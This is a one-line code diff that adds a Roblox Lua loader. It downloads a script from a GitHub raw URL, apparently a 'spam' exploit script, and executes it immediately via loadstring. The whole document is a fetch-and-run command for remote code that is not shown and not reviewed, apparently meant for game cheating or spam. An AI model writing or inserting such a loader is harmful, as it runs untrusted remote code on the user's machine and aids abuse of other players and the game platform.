@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/beta-buddytime-spam4-4rcd5kk0f7szet.lua"))()
